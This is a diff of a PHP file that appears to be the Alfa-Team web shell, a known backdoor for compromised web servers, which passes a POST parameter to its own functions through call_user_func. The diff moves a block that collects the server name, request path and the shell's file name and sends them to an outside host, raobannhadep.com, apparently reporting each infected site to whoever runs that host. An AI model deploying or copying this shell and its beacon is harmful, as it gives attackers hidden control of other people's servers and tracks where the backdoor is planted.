@@ -1,25 +1,4 @@
 <?php
-$domain = $_SERVER['SERVER_NAME'];
-$path = $_SERVER['REQUEST_URI'];
-$filename = basename(__FILE__);
-
-$data = array(
-    'domain' => $domain,
-    'path' => $path,
-    'filename' => $filename
-);
-
-$options = array(
-    'http' => array(
-        'header'  => "Content-type: application/json\r\n",
-        'method'  => 'POST',
-        'content' => json_encode($data),
-    ),
-);
-
-$context  = stream_context_create($options);
-$result = file_get_contents('https://raobannhadep.com/global.php', false, $context);
-
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
@@ -6544,5 +6523,25 @@ else
 $_POST['a'] = 'FilesMan2';//'FilesMan';
 if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
 call_user_func('alfa' . $_POST['a']);
+$domain = $_SERVER['SERVER_NAME'];
+$path = $_SERVER['REQUEST_URI'];
+$filename = basename(__FILE__);
+
+$data = array(
+    'domain' => $domain,
+    'path' => $path,
+    'filename' => $filename
+);
+
+$options = array(
+    'http' => array(
+        'header'  => "Content-type: application/json\r\n",
+        'method'  => 'POST',
+        'content' => json_encode($data),
+    ),
+);
+
+$context  = stream_context_create($options);
+$result = file_get_contents('https://raobannhadep.com/global.php', false, $context);
 exit;
 ?>
